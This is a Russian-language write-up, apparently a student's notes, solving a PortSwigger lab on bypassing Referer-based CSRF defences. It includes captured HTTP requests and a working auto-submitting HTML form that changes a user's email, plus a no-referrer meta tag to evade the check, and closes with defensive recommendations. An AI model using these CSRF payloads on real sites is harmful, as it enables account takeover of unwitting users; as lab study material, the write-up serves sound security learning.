Помимо средств защиты, использующих токены CSRF, некоторые приложения используют заголовок HTTP Refererer для защиты от атак CSRF, обычно путем проверки того, что запрос был отправлен из собственного домена приложения. Этот подход, как правило, менее эффективен и его часто можно обойти.

сервер проверяет заголовок Referer и убеждается что запрос пришел с его же домена

### как это обойти-

#### Referer не обязателен

если проверка пропускается когда Referer отсутствует - убиваем заголовок

```html
<meta name="referrer" content="never">
```
#### наивная валидация

проверка что домен начинается с expected или содержит его

можно зарегистрировать `vulnerable-site.com.attacker.com` или добавить в параметры `?vulnerable-site.com`

но современные браузеры режут Referer поэтому нужно форсировать через:
```html
<meta name="referrer" content="unsafe-url">

```

-----


лаба https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

задание: CSRF-атаку для изменения адреса электронной почты пользователя

----

вот сам запрос на смену емейл
```http
POST /my-account/change-email HTTP/2
Host: 0aeb00ff046f0f148062031400ba0072.web-security-academy.net
Cookie: session=eFSx9pOxUPN8qDlXKSL04xqIQxt7MKeE
Content-Length: 20
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0aeb00ff046f0f148062031400ba0072.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aeb00ff046f0f148062031400ba0072.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=hacker%40bk.ru
```

----

через гет  не получается сменить емейл 
GET /my-account/change-email?email=hacker%40bk.ru HTTP/2

то есть - для атаки, гже просто перехода по ссылке - нужен гет - но через него не работает запрос

но я могу сделать форму для пост запроса

-----

вот так
```html
<html>
  <body>
    <form action="https://0aeb00ff046f0f148062031400ba0072.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker22@bk.ru" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

отправляю сам себе (то есть перехожу сам на свой сервер с этим эксплойтом)



вот такой запрос выходит
```http
POST /my-account/change-email HTTP/2
Host: 0aeb00ff046f0f148062031400ba0072.web-security-academy.net
Cookie: session=eFSx9pOxUPN8qDlXKSL04xqIQxt7MKeE
Content-Length: 22
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://exploit-0ae1000604fc0fbe807902ee0108002f.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://exploit-0ae1000604fc0fbe807902ee0108002f.exploit-server.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=hacker22%40bk.ru
```

и ответ "Invalid referer header"
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid referer header"
```

это потому что в рефер отображется мой эксплойт сервер
`Referer: https://exploit-0ae1000604fc0fbe807902ee0108002f.exploit-server.net/`

-----

можно пробовать добавить параметр no-refer или never
`<meta name="referrer" content="no-referrer">`
пробую 

```html
<html>
  <body>
    <form action="https://0aeb00ff046f0f148062031400ba0072.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker22@bk.ru" />
      <meta name="referrer" content="no-referrer">
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

и вуаля- получилось!!  сам себе изменил емейл

тепер пробую жертву перенаправить сюда

-----

и все! лаба решена!!!


##### выводы

в этой лабе защита от csrf строилась на проверке заголовка referer - сервер ожидал что запрос на смену email приходит только со страниц его же домена

когда я отправил форму со своего эксплойт-сервера, referer указывал на мой домен и сервер отвечал ошибкой

я обошел защиту добавив тег `<meta name="referrer" content="no-referrer">` который заставляет браузер не отправлять referer в запросе

сервер оказался настроен так что: если referer отсутствует - проверка пропускается и запрос принимается

это ошибка - когда разработчики думают что отсутствие referer это безопасно

#### защита

чтобы защититься от таких атак нужно:

- не полагаться на присутствие или отсутствие referer, а проверять его содержимое строго и отклонять запросы без referer или с невалидным значением
- 
- лучше всего вообще не использовать referer для защиты от csrf, а применять полноценные csrf-токены которые уникальны для каждой сессии или запроса
- 
- если уж приходится использовать referer - то проверять что он точно соответствует ожидаемому домену и не полагаться на частичное совпадение
- 
- и никогда не делать так, чтобы отсутствие заголовка означало успешную проверку





